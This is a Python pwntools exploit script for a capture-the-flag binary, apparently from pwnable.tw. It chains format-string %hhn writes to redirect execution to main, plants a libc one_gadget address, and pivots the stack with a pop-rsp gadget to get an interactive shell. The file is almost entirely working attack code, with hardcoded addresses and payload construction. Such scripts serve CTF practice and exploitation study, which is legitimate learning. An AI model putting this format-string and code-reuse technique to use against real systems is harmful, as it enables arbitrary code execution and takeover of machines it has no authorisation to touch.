#!/usr/bin/env python2

from pwn import *
from qpwn import *
context(os='linux', log_level='debug')
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    #p = remote('chall.pwnable.tw', 10307)
    #libc = ELF('./libc.so.6')
    p = remote('localhost', 8888)
    libc = ELF('./libc-2.23.so')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

index = 10
passed = 0

def write_addr(addr, value, tot, index):
    global passed
    addr_ls = [addr, addr + 1, addr + 2, addr + 3, addr + 4, addr + 5]
    value_ls = [value & 0xff, (value >> 8) & 0xff, (value >> 16) & 0xff,
                (value >> 24) & 0xff, (value >> 32) & 0xff, (value >> 40) & 0xff]
    payload = ''
    passed &= 0xff
    for i in range(tot):
        now = (value_ls[i] - passed + 0x100) & 0xff
        if now == 0:
            now = 0x100
        if tot == 6 and i >= 4:
            payload += '%{}c%{}$hhn'.format(now, index + i + 1)
        else:
            payload += '%{}c%{}$hhn'.format(now, index + i)
        passed = value_ls[i]
    return payload

if __name__ == '__main__':
    #bc(0x7ffff7de9893, 0x0007FFFF7DE9869)
    passed += 584
    payload = '%584c%42$hn'
    target_addr = 0x601000
    main_addr = 0x0000000000400925
    stderr_addr = 0x0000000000601040
    one_gadget = 0x00007ffff7a39000 + 0xd5bf7
    payload += write_addr(target_addr, main_addr, 3, 14)
    payload += write_addr(stderr_addr, one_gadget, 1, 17)
    payload = payload.ljust(0x40, '\x00') + \
        flat(target_addr, target_addr + 1, target_addr + 2, stderr_addr)
    #bc(0x0007FFFF7DE9869, 0x000000000400939)
    p.sa('Input :', payload.ljust(0x80, '\x00'))

    passed = 37
    payload = '%37c%14$hhn'
    payload += write_addr(stderr_addr + 1, one_gadget >> 8, 2, 12)
    payload = payload.ljust(0x28, '\x00') + flat(stderr_addr + 1, stderr_addr + 2, '\x70')
    sleep(0.1)
    #bc(0x000000000400939)
    p.s(payload)

    payload = '%188c%16$hhn'.ljust(0x18, '\x00')
    pop_rsp_rrr_ret = 0x00000000004009bd
    ret = 0x00000000004006c9
    payload += flat(pop_rsp_rrr_ret, stderr_addr-0x18, 0x0, 0x0, 0x0, 0x00000000004006c9, '\x70')
    #bc(pop_rsp_rrr_ret)
    #gogogo()
    sleep(0.1)
    p.s(payload)
    p.i()
